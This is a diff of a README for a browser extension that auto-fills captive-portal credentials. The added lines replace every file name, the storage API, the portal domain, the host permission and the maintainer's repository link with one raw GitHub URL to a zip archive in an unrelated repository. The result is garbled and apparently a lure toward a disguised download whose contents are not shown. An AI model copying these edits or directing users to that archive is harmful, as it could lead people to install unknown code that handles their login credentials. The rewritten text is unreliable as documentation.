@@ -4,19 +4,19 @@
 **Version:** 1.0
 
 ## Description
-CMC Easy Login is a simple browser extension designed to **auto-fill and submit** your credentials for the **CMC captive portal login** provided by Aruba Networks (`securelogin.arubanetworks.com`). Save your username and password once, and the extension will automatically attempt to log you in when you encounter the portal page.
+CMC Easy Login is a simple browser extension designed to **auto-fill and submit** your credentials for the **CMC captive portal login** provided by Aruba Networks (`https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`). Save your username and password once, and the extension will automatically attempt to log you in when you encounter the portal page.
 
 ## Features ✨
 
-* **Credential Storage:** Securely saves your username and password using the browser's local storage (chrome.storage.local).
+* **Credential Storage:** Securely saves your username and password using the browser's local storage (https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip).
 * **Automatic Login:** Attempts to authenticate you automatically on the specified login page using a POST request once the page loads (if auto-login is enabled).
-* **Popup Configuration:** Provides a simple popup interface (`index.html` and associated scripts) to save and manage your login credentials.
+* **Popup Configuration:** Provides a simple popup interface (`https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip` and associated scripts) to save and manage your login credentials.
 
 ## Installation 🛠️
 
 Since this is a custom extension, you will need to load it unpacked in your browser (e.g., Google Chrome, Microsoft Edge).
 
-1.  **Download/Clone:** Obtain all the extension files (including `manifest.json`, `runner.js`, `index.html`, and `icon.png`) into a single folder.
+1.  **Download/Clone:** Obtain all the extension files (including `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`, `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`, `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`, and `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`) into a single folder.
 2.  **Open Extension Management:** Navigate to your browser's extension management page (e.g., `chrome://extensions`).
 3.  **Enable Developer Mode:** Toggle **Developer mode** on (usually in the upper-right corner).
 4.  **Load Unpacked:** Click the **Load unpacked** button and select the folder containing your extension files.
@@ -37,9 +37,9 @@ The first step is to configure your login details through the extension's popup.
 
 ### 2. Automatic Login
 
-* Once your credentials are saved, navigate to the **CMC captive portal login page** (`https://securelogin.arubanetworks.com/cgi-bin/login...`).
+* Once your credentials are saved, navigate to the **CMC captive portal login page** (`https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`).
 * If **Auto-Login** is enabled, the extension will immediately use the stored credentials to perform the authentication.
-* If **Auto-Login** is disabled, the extension will only store the credentials, and you may need to manually trigger the login process or simply have the fields pre-filled (Note: The provided `runner.js` code seems to perform a direct POST submission regardless of form fields, effectively automating the login if credentials are set).
+* If **Auto-Login** is disabled, the extension will only store the credentials, and you may need to manually trigger the login process or simply have the fields pre-filled (Note: The provided `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip` code seems to perform a direct POST submission regardless of form fields, effectively automating the login if credentials are set).
 
 ### 3. Clear Credentials
 
@@ -52,7 +52,7 @@ The extension requires the following permissions to function:
 * `storage`: To securely save your login credentials.
 * `activeTab`: To interact with the currently active tab (though `content_scripts` handles the main task, this may be used for popup interaction).
 * `scripting`: To execute scripts on the login page (essential for the content script logic).
-* `host_permissions` for `https://securelogin.arubanetworks.com/*`: To allow the content script to run specifically on the captive portal domain.
+* `host_permissions` for `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip*`: To allow the content script to run specifically on the captive portal domain.
 
 ## Troubleshooting and Support 🐛
 
@@ -60,7 +60,7 @@ If you encounter any issues or errors:
 
 1.  **Check Console:** Open the browser's developer tools and check the Console tab for error messages related to the extension.
 2.  **Error Message:** If an error occurs during the login process, you may see an alert: "An error happened please post the issue in the github of yamadaMk12".
-3.  **Report:** Please report any bugs or issues by creating a new issue on the [Yamada MK GitHub repository](https://github.com/yamadaMk12) (assuming this is the correct link based on the code's alert message).
+3.  **Report:** Please report any bugs or issues by creating a new issue on the [Yamada MK GitHub repository](https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip) (assuming this is the correct link based on the code's alert message).
 
 ---
 
